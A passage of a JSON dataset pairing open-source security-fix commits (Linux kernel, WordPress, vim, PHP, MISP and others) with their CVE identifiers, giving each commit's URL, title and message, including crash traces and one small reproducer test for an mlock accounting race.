  },
  "1205e20102c770b59916e0a4578057ec507d648a7931fd243a4c8ee6f56a3e6e": {
    "url": "https://github.com/torvalds/linux/commit/27463ad99f738ed93c7c8b3e2e5bc8c4853a2ff2",
    "title": "net: hns: Fix a skb used after free bug",
    "body": "skb maybe freed in hns_nic_net_xmit_hw() and return NETDEV_TX_OK,which cause hns_nic_net_xmit to use a freed skb.BUG: KASAN: use-after-free in hns_nic_net_xmit_hw+0x62c/0x940...[17659.112635] alloc_debug_processing+0x18c/0x1a0[17659.117208] __slab_alloc+0x52c/0x560[17659.120909] kmem_cache_alloc_node+0xac/0x2c0[17659.125309] __alloc_skb+0x6c/0x260[17659.128837] tcp_send_ack+0x8c/0x280[17659.132449] __tcp_ack_snd_check+0x9c/0xf0[17659.136587] tcp_rcv_established+0x5a4/0xa70[17659.140899] tcp_v4_do_rcv+0x27c/0x620[17659.144687] tcp_prequeue_process+0x108/0x170[17659.149085] tcp_recvmsg+0x940/0x1020[17659.152787] inet_recvmsg+0x124/0x180[17659.156488] sock_recvmsg+0x64/0x80[17659.160012] SyS_recvfrom+0xd8/0x180[17659.163626] __sys_trace_return+0x0/0x4[17659.167506] INFO: Freed in kfree_skbmem+0xa0/0xb0 age=23 cpu=1 pid=13[17659.174000] free_debug_processing+0x1d4/0x2c0[17659.178486] __slab_free+0x240/0x390[17659.182100] kmem_cache_free+0x24c/0x270[17659.186062] kfree_skbmem+0xa0/0xb0[17659.189587] __kfree_skb+0x28/0x40[17659.193025] napi_gro_receive+0x168/0x1c0[17659.197074] hns_nic_rx_up_pro+0x58/0x90[17659.201038] hns_nic_rx_poll_one+0x518/0xbc0[17659.205352] hns_nic_common_poll+0x94/0x140[17659.209576] net_rx_action+0x458/0x5e0[17659.213363] __do_softirq+0x1b8/0x480[17659.217062] run_ksoftirqd+0x64/0x80[17659.220679] smpboot_thread_fn+0x224/0x310[17659.224821] kthread+0x150/0x170[17659.228084] ret_from_fork+0x10/0x40BUG: KASAN: use-after-free in hns_nic_net_xmit+0x8c/0xc0...[17751.080490] __slab_alloc+0x52c/0x560[17751.084188] kmem_cache_alloc+0x244/0x280[17751.088238] __build_skb+0x40/0x150[17751.091764] build_skb+0x28/0x100[17751.095115] __alloc_rx_skb+0x94/0x150[17751.098900] __napi_alloc_skb+0x34/0x90[17751.102776] hns_nic_rx_poll_one+0x180/0xbc0[17751.107097] hns_nic_common_poll+0x94/0x140[17751.111333] net_rx_action+0x458/0x5e0[17751.115123] __do_softirq+0x1b8/0x480[17751.118823] run_ksoftirqd+0x64/0x80[17751.122437] smpboot_thread_fn+0x224/0x310[17751.126575] kthread+0x150/0x170[17751.129838] ret_from_fork+0x10/0x40[17751.133454] INFO: Freed in kfree_skbmem+0xa0/0xb0 age=19 cpu=7 pid=43[17751.139951] free_debug_processing+0x1d4/0x2c0[17751.144436] __slab_free+0x240/0x390[17751.148051] kmem_cache_free+0x24c/0x270[17751.152014] kfree_skbmem+0xa0/0xb0[17751.155543] __kfree_skb+0x28/0x40[17751.159022] napi_gro_receive+0x168/0x1c0[17751.163074] hns_nic_rx_up_pro+0x58/0x90[17751.167041] hns_nic_rx_poll_one+0x518/0xbc0[17751.171358] hns_nic_common_poll+0x94/0x140[17751.175585] net_rx_action+0x458/0x5e0[17751.179373] __do_softirq+0x1b8/0x480[17751.183076] run_ksoftirqd+0x64/0x80[17751.186691] smpboot_thread_fn+0x224/0x310[17751.190826] kthread+0x150/0x170[17751.194093] ret_from_fork+0x10/0x40Fixes: 13ac695 (\"net:hns: Add support of Hip06 SoC to the Hislicon Network Subsystem\")Signed-off-by: Yunsheng Lin <linyunsheng@huawei.com>Signed-off-by: lipeng <lipeng321@huawei.com>Reported-by: Jun He <hjat2005@huawei.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-18218"
    ],
    "cveIdsCount": 1
  },
  "e4af893c55f3aa4a8d256c2584af9acd8c38b885ee7e70111b9bec731e104213": {
    "url": "https://github.com/torvalds/linux/commit/70feee0e1ef331b22cc51f383d532a0d043fbdcc",
    "title": "mlock: fix mlock count can not decrease in race condition",
    "body": "Kefeng reported that when running the follow test, the mlock count inmeminfo will increase permanently: [1] testcase linux:~ # cat test_mlockal grep Mlocked /proc/meminfo for j in `seq 0 10` do for i in `seq 4 15` do ./p_mlockall >> log & done sleep 0.2 done # wait some time to let mlock counter decrease and 5s may not enough sleep 5 grep Mlocked /proc/meminfo linux:~ # cat p_mlockall.c #include <sys/mman.h> #include <stdlib.h> #include <stdio.h> #define SPACE_LEN4096 int main(int argc, char ** argv) { int ret; void *adr = malloc(SPACE_LEN); if (!adr) return -1; ret = mlockall(MCL_CURRENT | MCL_FUTURE); printf(\"mlcokall ret = %d\\n\", ret); ret = munlockall(); printf(\"munlcokall ret = %d\\n\", ret); free(adr); return 0; }In __munlock_pagevec() we should decrement NR_MLOCK for each page wherewe clear the PageMlocked flag. Commit 1ebb7cc (\"mm: munlock: batchNR_MLOCK zone state updates\") has introduced a bug where we don'tdecrement NR_MLOCK for pages where we clear the flag, but fail toisolate them from the lru list (e.g. when the pages are on some othercpu's percpu pagevec). Since PageMlocked stays cleared, the NR_MLOCKaccounting gets permanently disrupted by this.Fix it by counting the number of page whose PageMlock flag is cleared.Fixes: 1ebb7cc (\" mm: munlock: batch NR_MLOCK zone state updates\")Link: http://lkml.kernel.org/r/1495678405-54569-1-git-send-email-xieyisheng1@huawei.comSigned-off-by: Yisheng Xie <xieyisheng1@huawei.com>Reported-by: Kefeng Wang <wangkefeng.wang@huawei.com>Tested-by: Kefeng Wang <wangkefeng.wang@huawei.com>Cc: Vlastimil Babka <vbabka@suse.cz>Cc: Joern Engel <joern@logfs.org>Cc: Mel Gorman <mgorman@suse.de>Cc: Michel Lespinasse <walken@google.com>Cc: Hugh Dickins <hughd@google.com>Cc: Rik van Riel <riel@redhat.com>Cc: Johannes Weiner <hannes@cmpxchg.org>Cc: Michal Hocko <mhocko@suse.cz>Cc: Xishi Qiu <qiuxishi@huawei.com>Cc: zhongjiang <zhongjiang@huawei.com>Cc: Hanjun Guo <guohanjun@huawei.com>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-18221"
    ],
    "cveIdsCount": 1
  },
  "dc4d20ee7746f45db8cd7a25737acab53a0c2d1e19ced6c8b87421b0a42e457f": {
    "url": "https://github.com/torvalds/linux/commit/412b65d15a7f8a93794653968308fc100f2aa87c",
    "title": "net: hns: fix ethtool_get_strings overflow in hns driver",
    "body": "hns_get_sset_count() returns HNS_NET_STATS_CNT and the data space allocatedis not enough for ethtool_get_strings(), which will cause random memorycorruption.When SLAB and DEBUG_SLAB are both enabled, memory corruptions like thethe following can be observed without this patch:[ 43.115200] Slab corruption (Not tainted): Acpi-ParseExt start=ffff801fb0b69030, len=80[ 43.115206] Redzone: 0x9f911029d006462/0x5f78745f31657070.[ 43.115208] Last user: [<5f7272655f746b70>](0x5f7272655f746b70)[ 43.115214] 010: 70 70 65 31 5f 74 78 5f 70 6b 74 00 6b 6b 6b 6b ppe1_tx_pkt.kkkk[ 43.115217] 030: 70 70 65 31 5f 74 78 5f 70 6b 74 5f 6f 6b 00 6b ppe1_tx_pkt_ok.k[ 43.115218] Next obj: start=ffff801fb0b69098, len=80[ 43.115220] Redzone: 0x706d655f6f666966/0x9f911029d74e35b.[ 43.115229] Last user: [<ffff0000084b11b0>](acpi_os_release_object+0x28/0x38)[ 43.115231] 000: 74 79 00 6b 6b 6b 6b 6b 70 70 65 31 5f 74 78 5f ty.kkkkkppe1_tx_[ 43.115232] 010: 70 6b 74 5f 65 72 72 5f 63 73 75 6d 5f 66 61 69 pkt_err_csum_faiSigned-off-by: Timmy Li <lixiaoping3@huawei.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-18222"
    ],
    "cveIdsCount": 1
  },
  "4123f2615144d8db6e01bf815b8041fc33e77867046e78262a3835613fea0432": {
    "url": "https://github.com/torvalds/linux/commit/d4fdf8ba0e5808ba9ad6b44337783bd9935e0982",
    "title": "f2fs: fix a panic caused by NULL flush_cmd_control",
    "body": "Mount fs with option noflush_merge, boot failed for illegal addressfcc in function f2fs_issue_flush: if (!test_opt(sbi, FLUSH_MERGE)) { ret = submit_flush_wait(sbi); atomic_inc(&fcc->issued_flush); -> Here, fcc illegal return ret; }Signed-off-by: Yunlei He <heyunlei@huawei.com>Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>",
    "cveIds": [
      "CVE-2017-18241"
    ],
    "cveIdsCount": 1
  },
  "e0ab11d8c8d0f7b08175445391153301bdbeb778a58044e3dcabb76863265806": {
    "url": "https://github.com/apple/cups/commit/49fa4983f25b64ec29d548ffa3b9782426007df3",
    "title": "DBUS notifications could crash the scheduler (Issue #5143)",
    "body": "- scheduler/ipp.c: Make sure requesting-user-name string is valid UTF-8.",
    "cveIds": [
      "CVE-2017-18248"
    ],
    "cveIdsCount": 1
  },
  "850ab20dd17845ad662186415e02356534b5b892918d7b057dfff92edc3814cb": {
    "url": "https://github.com/projectatomic/bubblewrap/commit/d7fc532c42f0e9bf427923bab85433282b3e5117",
    "title": "Call setsid() before executing sandboxed code (CVE-2017-5226)",
    "body": "This prevents the sandboxed code from getting a controlling tty,which in turn prevents it from accessing the TIOCSTI ioctl and hencefaking terminal input.Fixes: #142Closes: #143Approved by: cgwalters",
    "cveIds": [
      "CVE-2017-5226"
    ],
    "cveIdsCount": 1
  },
  "18b232fd52bd7bd224f059764a39ca44dd63f4573f1e327b443b1049c5d7d52b": {
    "url": "https://github.com/semplon/GeniXCMS/commit/6e21c01d87672d81080450e6913e0093a02bfab8",
    "title": "Add Post Param at Hooks",
    "body": "Filter Categories for TagsChange $url position to correct location at Comments.class.phpAdd Author Pages#60 Security Fix IssueChange Ajax URL Router formatChange Ajax, Mods router scrapper",
    "cveIds": [
      "CVE-2017-5345"
    ],
    "cveIdsCount": 1
  },
  "a58ff634f040241ad78ef4c82c246f84b5c6c27aaf29eeb592b2c93a12c1e110": {
    "url": "https://github.com/WordPress/WordPress/commit/daf358983cc1ce0c77bf6d2de2ebbb43df2add60",
    "title": "REST API: Change which users are shown in the users endpoint.",
    "body": "Only show users that have authored a post of a post type that has `show_in_rest` set to true.Props rachelbaker, jnylen0.See #38878.Built from https://develop.svn.wordpress.org/trunk@39843git-svn-id: http://core.svn.wordpress.org/trunk@39781 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-5487"
    ],
    "cveIdsCount": 1
  },
  "13f8840d8868fe59501c9869e78fa0ccf40c1f08dffe3d99c97a4799deb4d781": {
    "url": "https://github.com/WordPress/WordPress/commit/c9ea1de1441bb3bda133bf72d513ca9de66566c2",
    "title": "Updates: Translate plugin data on the Updates screen.",
    "body": "Built from https://develop.svn.wordpress.org/trunk@39808git-svn-id: http://core.svn.wordpress.org/trunk@39746 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-5488"
    ],
    "cveIdsCount": 1
  },
  "79fa385c0d0d27e8911854a525708c70fdf0ef231ecd64f0db91b6d16c06ca4f": {
    "url": "https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359",
    "title": "Themes: Fix markup for theme name fallbacks.",
    "body": "Built from https://develop.svn.wordpress.org/trunk@39807git-svn-id: http://core.svn.wordpress.org/trunk@39745 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-5490"
    ],
    "cveIdsCount": 1
  },
  "e8ccecf1c7e4b7a397950245124066a6a13356efaad4f552cf8a5b5e739e41d7": {
    "url": "https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733",
    "title": "Add nonce for widget accessibility mode.",
    "body": "Props vortfu.See #23328.Built from https://develop.svn.wordpress.org/trunk@39760git-svn-id: http://core.svn.wordpress.org/trunk@39698 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2017-5492"
    ],
    "cveIdsCount": 1
  },
  "731d02325f5accf947da258f69ac7738458b7f73a69acbe28f7af5698a32617a": {
    "url": "https://github.com/b2evolution/b2evolution/commit/261dbd5b294e707af766691e65a177a290314a6e",
    "title": "Updated file types table to only allow admins to upload files with SW…",
    "body": "…F extension",
    "cveIds": [
      "CVE-2017-5494"
    ],
    "cveIdsCount": 1
  },
  "cacb1bcf943fbc263f9046a975178ad9e0709845b6804349c7a5957a61687226": {
    "url": "https://github.com/WeblateOrg/weblate/commit/abe0d2a29a1d8e896bfe829c8461bf8b391f1079",
    "title": "Do not show validation error on password reset",
    "body": "This can leak information whether account exists or not.Fixes #1317Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2017-5537"
    ],
    "cveIdsCount": 1
  },
  "a3ea550323cdc1676c3c5d253ee2fb272da4ce10f34b822cf6fe05abd6a4a5dd": {
    "url": "https://github.com/libimobiledevice/libplist/commit/7391a506352c009fe044dead7baad9e22dd279ee",
    "title": "plistutil: Prevent OOB heap buffer read by checking input size",
    "body": "As pointed out in #87 plistutil would do a memcmp with a heap bufferwithout checking the size. If the size is less than 8 it would readbeyond the bounds of this heap buffer. This commit prevents that.",
    "cveIds": [
      "CVE-2017-5545"
    ],
    "cveIdsCount": 1
  },
  "9f1f67f6ba2d17365f43e962d6d393f4922f436c719eca306886e368ad40d87f": {
    "url": "https://github.com/torvalds/linux/commit/6d104af38b570d37aa32a5803b04c354f8ed513d",
    "title": "HID: corsair: fix DMA buffers on stack",
    "body": "Not all platforms support DMA to the stack, and specifically since v4.9this is no longer supported on x86 with VMAP_STACK either.Note that the macro-mode buffer was larger than necessary.Fixes: 6f78193 (\"HID: corsair: Add Corsair Vengeance K90 driver\")Cc: stable <stable@vger.kernel.org>Signed-off-by: Johan Hovold <johan@kernel.org>Signed-off-by: Jiri Kosina <jkosina@suse.cz>",
    "cveIds": [
      "CVE-2017-5547"
    ],
    "cveIdsCount": 1
  },
  "eaea23b1590e01ad6523fee00af0964ddb6a2c9aeda230df0428567a363d3463": {
    "url": "https://github.com/torvalds/linux/commit/05a974efa4bdf6e2a150e3f27dc6fcf0a9ad5655",
    "title": "ieee802154: atusb: do not use the stack for buffers to make them DMA …",
    "body": "…ableFrom 4.9 we should really avoid using the stack here as this will not be DMAable on various platforms. This changes the buffers already being present intime of 4.9 being released. This should go into stable as well.Reported-by: Dan Carpenter <dan.carpenter@oracle.com>Cc: stable@vger.kernel.orgSigned-off-by: Stefan Schmidt <stefan@osg.samsung.com>Signed-off-by: Marcel Holtmann <marcel@holtmann.org>",
    "cveIds": [
      "CVE-2017-5548"
    ],
    "cveIdsCount": 1
  },
  "8f623a6134b6b65763fe809c647606a41d647b0222d3df690becb208ded02f71": {
    "url": "https://github.com/torvalds/linux/commit/b9dc6f65bc5e232d1c05fe34b5daadc7e8bbf1fb",
    "title": "fix a fencepost error in pipe_advance()",
    "body": "The logics in pipe_advance() used to release all buffers past the newposition failed in cases when the number of buffers to release was equalto pipe->buffers. If that happened, none of them had been released,leaving pipe full. Worse, it was trivial to trigger and we end up withpipe full of uninitialized pages. IOW, it's an infoleak.Cc: stable@vger.kernel.org # v4.9Reported-by: \"Alan J. Wylie\" <alan@wylie.me.uk>Tested-by: \"Alan J. Wylie\" <alan@wylie.me.uk>Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>",
    "cveIds": [
      "CVE-2017-5550"
    ],
    "cveIdsCount": 1
  },
  "49866e807c1d5c7ea1d2d3ea1b6b090cdda07acd8543f70929060a004c853740": {
    "url": "https://github.com/torvalds/linux/commit/0f2ff82e11c86c05d051cae32b58226392d33bbf",
    "title": "drm/vc4: Fix an integer overflow in temporary allocation layout.",
    "body": "We copy the unvalidated ioctl arguments from the user into kerneltemporary memory to run the validation from, to avoid a race where theuser updates the unvalidate contents in between validating them andcopying them into the validated BO.However, in setting up the layout of the kernel side, we failed tocheck one of the additions (the roundup() for shader_rec_offset)against integer overflow, allowing a nearly MAX_UINT value ofbin_cl_size to cause us to under-allocate the temporary space that wethen copy_from_user into.Reported-by: Murray McAllister <murray.mcallister@insomniasec.com>Signed-off-by: Eric Anholt <eric@anholt.net>Fixes: d5b1a78 (\"drm/vc4: Add support for drawing 3D frames.\")",
    "cveIds": [
      "CVE-2017-5576"
    ],
    "cveIdsCount": 1
  },
  "9816cbed97a80aae941164d2e535027fc8d910a26bf063fb052254278c862a93": {
    "url": "https://github.com/TigerVNC/tigervnc/commit/18c020124ff1b2441f714da2017f63dba50720ba",
    "title": "Fix buffer overflow in ModifiablePixelBuffer::fillRect.",
    "body": "It can be triggered by RRE message with subrectangle out of framebufferboundaries. It may prevent the same kind of issue caused by evil messagefrom another encoding too.",
    "cveIds": [
      "CVE-2017-5581"
    ],
    "cveIdsCount": 1
  },
  "094a7dbb09fb17bd1ed89a074e6b688aeaec51d282ed96ce8e8c12a06a9fd1d1": {
    "url": "https://github.com/sandstorm-io/sandstorm/commit/4ea8df7403381d9b657b121b3c98d8081b27414d",
    "title": "Improve security of zip/unzip sandbox by switching the sandboxed file…",
    "body": "…system from blacklisting directories to whitelisting them.",
    "cveIds": [
      "CVE-2017-6200"
    ],
    "cveIdsCount": 1
  },
  "c1c84ba2f6fb01ad72ab311fe275ed0cf32981a85f28b10a1d08dafc4660374e": {
    "url": "https://github.com/torvalds/linux/commit/8b74d439e1697110c5e5c600643e823eb1dd0762",
    "title": "net/llc: avoid BUG_ON() in skb_orphan()",
    "body": "It seems nobody used LLC since linux-3.12.Fortunately fuzzers like syzkaller still know how to run this code,otherwise it would be no fun.Setting skb->sk without skb->destructor leads to all kinds ofbugs, we now prefer to be very strict about it.Ideally here we would use skb_set_owner() but this helper does not exist yet,only CAN seems to have a private helper for that.Fixes: 376c731 (\"net: add a temporary sanity check in skb_orphan()\")Signed-off-by: Eric Dumazet <edumazet@google.com>Reported-by: Andrey Konovalov <andreyknvl@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-6345"
    ],
    "cveIdsCount": 1
  },
  "2ad22c0c3d5e5c490a88d0d9ed3eb7c6937236710f9741b41c7e2b55a7398c3d": {
    "url": "https://github.com/torvalds/linux/commit/d199fab63c11998a602205f7ee7ff7c05c97164b",
    "title": "packet: fix races in fanout_add()",
    "body": "Multiple threads can call fanout_add() at the same time.We need to grab fanout_mutex earlier to avoid races that couldlead to one thread freeing po->rollover that was set by another thread.Do the same in fanout_release(), for peace of mind, and to help usfinding lockdep issues earlier.Fixes: dc99f60 (\"packet: Add fanout support.\")Fixes: 0648ab7 (\"packet: rollover prepare: per-socket state\")Signed-off-by: Eric Dumazet <edumazet@google.com>Cc: Willem de Bruijn <willemb@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-6346"
    ],
    "cveIdsCount": 1
  },
  "76d96752f306d560091aa36caeed4d4c57d7517eddf0b5e30298335da0714d02": {
    "url": "https://github.com/torvalds/linux/commit/ca4ef4574f1ee5252e2cd365f8f5d5bafd048f32",
    "title": "ip: fix IP_CHECKSUM handling",
    "body": "The skbs processed by ip_cmsg_recv() are not guaranteed tobe linear e.g. when sending UDP packets over loopback withMSGMORE.Using csum_partial() on [potentially] the whole skb lenis dangerous; instead be on the safe side and use skb_checksum().Thanks to syzkaller team to detect the issue and provide thereproducer.v1 -> v2: - move the variable declaration in a tighter scopeFixes: ad6f939 (\"ip: Add offset parameter to ip_cmsg_recv\")Reported-by: Andrey Konovalov <andreyknvl@google.com>Signed-off-by: Paolo Abeni <pabeni@redhat.com>Acked-by: Eric Dumazet <edumazet@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-6347"
    ],
    "cveIdsCount": 1
  },
  "7881cc04dfa5c2531fe9c6f5160f18658038ce8f7aebc9f2ac69d1d47634558c": {
    "url": "https://github.com/vim/vim/commit/3eb1637b1bba19519885dd6d377bd5596e91d22c",
    "title": "patch 8.0.0377: possible overflow when reading corrupted undo file",
    "body": "Problem: Possible overflow when reading corrupted undo file.Solution: Check if allocated size is not too big. (King)",
    "cveIds": [
      "CVE-2017-6349"
    ],
    "cveIdsCount": 1
  },
  "3784b051447f816caf484be882eed46de0e860956b35345f505205f9ffbd4ec2": {
    "url": "https://github.com/vim/vim/commit/0c8485f0e4931463c0f7986e1ea84a7d79f10c75",
    "title": "patch 8.0.0378: possible overflow when reading corrupted undo file",
    "body": "Problem: Another possible overflow when reading corrupted undo file.Solution: Check if allocated size is not too big. (King)",
    "cveIds": [
      "CVE-2017-6350"
    ],
    "cveIdsCount": 1
  },
  "ef9f6ecb56d2f6eee135f42cc1a6adad6dbb191014450f2a9eec4c76a3b41606": {
    "url": "https://github.com/kaltura/server/commit/041a6d5e8336f7713985b120139c8f4b6279a337",
    "title": "Merge pull request #5304 from kaltura/strip_tags",
    "body": "call strip_tags on all values extracted from $_GET[]",
    "cveIds": [
      "CVE-2017-6391",
      "CVE-2017-6392"
    ],
    "cveIdsCount": 2
  },
  "5450b0bcb5672e3c15c67d815b1a88ed0f38d7b1229195e5f03ab435ee2481d4": {
    "url": "https://github.com/cesanta/mongoose-os/commit/042eb437973a202d00589b13d628181c6de5cf5b",
    "title": "Fix crash in multipart handling",
    "body": "Close cesanta/dev#6974PUBLISHED_FROM=4d4e4a46eceba10aec8dacb7f8f58bd078c92307",
    "cveIds": [
      "CVE-2017-7185"
    ],
    "cveIdsCount": 1
  },
  "9a9287fc01a22c1c364528bfbee88b08f35699fead42c886a0bce31f21d356d8": {
    "url": "https://github.com/cesanta/mongoose/commit/b8402ed0733e3f244588b61ad5fedd093e3cf9cc",
    "title": "Fix crash in multipart handling",
    "body": "Close cesanta/dev#6974PUBLISHED_FROM=4d4e4a46eceba10aec8dacb7f8f58bd078c92307",
    "cveIds": [
      "CVE-2017-7185"
    ],
    "cveIdsCount": 1
  },
  "c20d6a6ed02f587e5d3878f1545b5579b69c3f5998a1aa86258f3f391aef420b": {
    "url": "https://github.com/php/php-src/commit/bab0b99f376dac9170ac81382a5ed526938d595a",
    "title": "Detect invalid port in xp_socket parse ip address",
    "body": "For historical reasons, fsockopen() accepts the port and hostnameseparately: fsockopen('127.0.0.1', 80)However, with the introdcution of stream transports in PHP 4.3,it became possible to include the port in the hostname specifier:fsockopen('127.0.0.1:80')Or more formally: fsockopen('tcp://127.0.0.1:80')Confusing results when these two forms are combined, however.fsockopen('127.0.0.1:80', 443) results in fsockopen() attemptingto connect to '127.0.0.1:80:443' which any reasonable stack wouldconsider invalid.Unfortunately, PHP parses the address looking for the first colon(with special handling for IPv6, don't worry) and calls atoi()from there. atoi() in turn, simply stops parsing at the firstnon-numeric character and returns the value so far.The end result is that the explicitly supplied port is treatedas ignored garbage, rather than producing an error.This diff replaces atoi() with strtol() and inspects thestop character. If additional \"garbage\" of any kind is found,it fails and returns an error.",
    "cveIds": [
      "CVE-2017-7189"
    ],
    "cveIdsCount": 1
  },
  "a60fdbcfc574f719856ab2608291c1fd93138040ea130edcaa4cca15093704ac": {
    "url": "https://github.com/irssi/irssi/commit/77b2631c78461965bc9a7414aae206b5c514e1b3",
    "title": "Merge branch 'netjoin-timeout' into 'master'",
    "body": "fe-netjoin: remove irc servers on \"server disconnected\" signalCloses #7See merge request !10",
    "cveIds": [
      "CVE-2017-7191"
    ],
    "cveIdsCount": 1
  },
  "a633dc7745fe595237dc34df620361a17fb76ada42a4f81b6a180c40add5499e": {
    "url": "https://github.com/MISP/MISP/commit/599b3638384bfe49fa527bcb060f3f608a296996",
    "title": "fix: Tightened sanitisation in some view elements",
    "body": "- on the index filter tool- organisation landing pageas reported by Tien Phan and David Maciejak of Fortinet's FortiGuard Labs",
    "cveIds": [
      "CVE-2017-7215"
    ],
    "cveIdsCount": 1
  },
  "276045d95e5a579968bcfa0ceefdd3b0b96687599f1832f104c45c4acfc29f11": {
    "url": "https://github.com/MISP/MISP/commit/3630a8b1e1cd99862867fe72ffa1ff51e4d9c09f",
    "title": "fix: Tightened sanitisation in some view elements",
    "body": "- on the index filter tool- organisation landing pageas reported by Tien Phan and David Maciejak of Fortinet's FortiGuard Labs.",
    "cveIds": [
      "CVE-2017-7215"
    ],
    "cveIdsCount": 1
  },
  "5fe481426eac4f921b569f34dfe523e7ad0c94c98896dd883c46b70e904e0950": {
    "url": "http://github.com/mantisbt/mantisbt/commit/a85b0b96c8ebe3e010d0d016cf88ab3c8bfc196a",
    "title": "Sanitize window title",
    "body": "The window title is not sanitized. That is not an issue when CSP is enable (default),but if disabled, it can execute javascript that is set by a user who has accessto set configuration via Manage - Manage Configuration - Configuration Report page.Fixes #22266",
    "cveIds": [
      "CVE-2017-7222"
    ],
    "cveIdsCount": 1
  },
  "bf7720c609f9f198591f1e8a84747752a287b24a5d7441fe81ba2edd5ccaa713": {
    "url": "https://github.com/yiisoft/yii2/commit/97171a0db7cda0a49931ee0c3b998ef50bd06756",
    "title": "Fixes #13401: Fixed lack of escaping of request dump at exception scr…",
    "body": "…eens",
    "cveIds": [
      "CVE-2017-7271"
    ],
    "cveIdsCount": 1
  },
  "99d648d61b6f9b7bd6c1716405f9f22b0000a3a50f48a8de6f1791a475d0f97d": {
    "url": "https://github.com/torvalds/linux/commit/8605330aac5a5785630aec8f64378a54891937cc",
    "title": "tcp: fix SCM_TIMESTAMPING_OPT_STATS for normal skbs",
    "body": "__sock_recv_timestamp can be called for both normal skbs (forreceive timestamps) and for skbs on the error queue (for transmittimestamps).Commit 1c88580(tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING)assumes any skb passed to __sock_recv_timestamp are fromthe error queue, containing OPT_STATS in the content of the skb.This results in accessing invalid memory or generating junkdata.To fix this, set skb->pkt_type to PACKET_OUTGOING for packetson the error queue. This is safe because on the receive pathon local sockets skb->pkt_type is never set to PACKET_OUTGOING.With that, copy OPT_STATS from a packet, only if its pkt_typeis PACKET_OUTGOING.Fixes: 1c88580 (\"tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING\")Reported-by: JongHwan Kim <zzoru007@gmail.com>Signed-off-by: Soheil Hassas Yeganeh <soheil@google.com>Signed-off-by: Eric Dumazet <edumazet@google.com>Signed-off-by: Willem de Bruijn <willemb@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-7277"
    ],
    "cveIdsCount": 1
  },
  "1dcd664f21af93d67e26989bd7e6cfd11a69a181a2d9940386f98c756b6211e7": {
    "url": "https://github.com/torvalds/linux/commit/4ef1b2869447411ad3ef91ad7d4891a83c1a509a",
    "title": "tcp: mark skbs with SCM_TIMESTAMPING_OPT_STATS",
    "body": "SOF_TIMESTAMPING_OPT_STATS can be enabled and disabledwhile packets are collected on the error queue.So, checking SOF_TIMESTAMPING_OPT_STATS in sk->sk_tsflagsis not enough to safely assume that the skb containsOPT_STATS data.Add a bit in sock_exterr_skb to indicate whether theskb contains opt_stats data.Fixes: 1c88580 (\"tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING\")Reported-by: JongHwan Kim <zzoru007@gmail.com>Signed-off-by: Soheil Hassas Yeganeh <soheil@google.com>Signed-off-by: Eric Dumazet <edumazet@google.com>Signed-off-by: Willem de Bruijn <willemb@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-7277"
    ],
    "cveIdsCount": 1
  },
  "8fb493b54be66dbd88fcfb95dbf54ecab45ed3afb8098a78daf85866f40a6955": {
    "url": "https://github.com/torvalds/linux/commit/1b53cf9815bb4744958d41f3795d5d5a1d365e2d",
    "title": "fscrypt: remove broken support for detecting keyring key revocation",
    "body": "Filesystem encryption ostensibly supported revoking a keyring key thathad been used to \"unlock\" encrypted files, causing those files to become\"locked\" again. This was, however, buggy for several reasons, the mostsevere of which was that when key revocation happened to be detected foran inode, its fscrypt_info was immediately freed, even while otherthreads could be using it for encryption or decryption concurrently.This could be exploited to crash the kernel or worse.This patch fixes the use-after-free by removing the code which detectsthe keyring key having been revoked, invalidated, or expired. Instead,an encrypted inode that is \"unlocked\" now simply remains unlocked untilit is evicted from memory. Note that this is no worse than the case forblock device-level encryption, e.g. dm-crypt, and it still remainspossible for a privileged user to evict unused pages, inodes, anddentries by running 'sync; echo 3 > /proc/sys/vm/drop_caches', or bysimply unmounting the filesystem. In fact, one of those actions wasalready needed anyway for key revocation to work even somewhat sanely.This change is not expected to break any applications.In the future I'd like to implement a real API for fscrypt keyrevocation that interacts sanely with ongoing filesystem operations ---waiting for existing operations to complete and blocking new operations,and invalidating and sanitizing key material and plaintext from the VFScaches. But this is a hard problem, and for now this bug must be fixed.This bug affected almost all versions of ext4, f2fs, and ubifsencryption, and it was potentially reachable in any kernel configuredwith encryption support (CONFIG_EXT4_ENCRYPTION=y,CONFIG_EXT4_FS_ENCRYPTION=y, CONFIG_F2FS_FS_ENCRYPTION=y, orCONFIG_UBIFS_FS_ENCRYPTION=y). Note that older kernels did not use theshared fs/crypto/ code, but due to the potential security implicationsof this bug, it may still be worthwhile to backport this fix to them.Fixes: b7236e2 (\"ext4 crypto: reorganize how we store keys in the inode\")Cc: stable@vger.kernel.org # v4.2+Signed-off-by: Eric Biggers <ebiggers@google.com>Signed-off-by: Theodore Ts'o <tytso@mit.edu>Acked-by: Michael Halcrow <mhalcrow@google.com>",
    "cveIds": [
      "CVE-2017-7374"
    ],
    "cveIdsCount": 1
  },
